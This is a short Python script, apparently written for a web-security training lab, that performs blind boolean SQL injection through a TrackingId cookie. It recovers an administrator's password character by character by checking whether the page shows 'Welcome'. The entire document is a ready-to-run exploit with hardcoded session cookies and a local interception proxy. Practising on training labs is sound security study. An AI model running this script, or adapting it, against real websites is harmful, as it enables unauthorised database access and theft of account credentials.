import sys
import requests
import urllib3
import urllib

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http':'http://127.0.0.1:8080','https':'https://127.0.0.1:8080'}


def sqli_password(url):
	password_extracted = ""
	for i in range (1,21):
		for j in range(32,126):
			sql_payload = "' and (select ascii(substring(password,%s,1)) from users where username = 'administrator') = '%s'--" %(i,j)
			# sql_payload = "' and (select username from users where username='administrator')='administrator'--"
			sql_payload_encoded = urllib.parse.quote(sql_payload)
			cookies = {'TrackingId':'kNJVHQne8GZGxR8C' + sql_payload_encoded,
			'session': 'aFeimXUKiSt5UtSEoo5Qr38reYLbswkR'}
			r = requests.get(url,cookies = cookies, verify = False,proxies=proxies)
			if "Welcome" not in r.text:
				# sys.stdout.write("PRiyanka")
				sys.stdout.write('\r' + password_extracted + chr(j))
				sys.stdout.flush()
			else:
				# sys.stdout.write("else called")
				password_extracted += chr(j)
				sys.stdout.write('\r'+password_extracted)
				sys.stdout.flush()
				break


def __main__():
	if len(sys.argv) != 2:
		print("(+) Usage: %s <url>" % sys.argv[0])
		print("(+) Example: %s www.example.com" %sys.argv[0])

	url = sys.argv[1]
	print("(+) retrieving administrator password....")	
	sqli_password(url)



if __name__ == "__main__":
	__main__()		